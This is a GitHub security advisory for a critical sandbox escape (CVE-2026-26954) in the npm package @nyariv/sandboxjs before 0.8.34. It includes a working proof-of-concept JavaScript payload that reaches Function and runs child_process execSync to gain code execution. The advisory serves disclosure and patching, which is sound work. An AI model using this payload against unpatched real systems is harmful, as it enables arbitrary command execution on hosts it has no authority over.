# [C] SandboxJS affected by a Sandbox Escape

## Summary
Severity: Critical
Advisory: GHSA-6r9f-759j-hjgv
CVE: CVE-2026-26954
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-13
Source: https://github.com/advisories/GHSA-6r9f-759j-hjgv
Type: github-advisory

## Affected
- npm: `@nyariv/sandboxjs` — affected >=0 <0.8.34

## Details
### Summary

It is possible to obtain arrays containing `Function`, which allows escaping the sandbox.

### Details

There are various ways to get an array containing `Function`, e.g.

```js
Object.entries(this).at(1) // [ 'Function', [Function: Function] ]
Object.values(this).slice(1, 2) // [ [Function: Function] ]
```

Given an array containing `Function`, and  `Object.fromEntries`, it is possible to construct `{[p]: Function}` where `p` is any constructible property. This can be used to escape the sandbox.

### PoC
```js
const s = require('.').default;
const sb = new s();

payload = `
const p = (async function () {})();
({
  "finally": p.finally,
  ...Object.fromEntries([['then', ...Object.values(this).slice(1)]]),
}).finally('a=process.getBuiltinModule("child_process").execSync("ls", {stdio: "inherit"})')();
`;

sb.compile(payload)().run();
```

### Impact

Sandbox Escape -> RCE

## References
- https://github.com/nyariv/SandboxJS/security/advisories/GHSA-6r9f-759j-hjgv
- https://nvd.nist.gov/vuln/detail/CVE-2026-26954
- https://github.com/nyariv/SandboxJS/commit/e01505b1ea49f4f13956cd12b7ce01b83d2ee085
- https://github.com/nyariv/SandboxJS
- https://github.com/nyariv/SandboxJS/releases/tag/v0.8.34
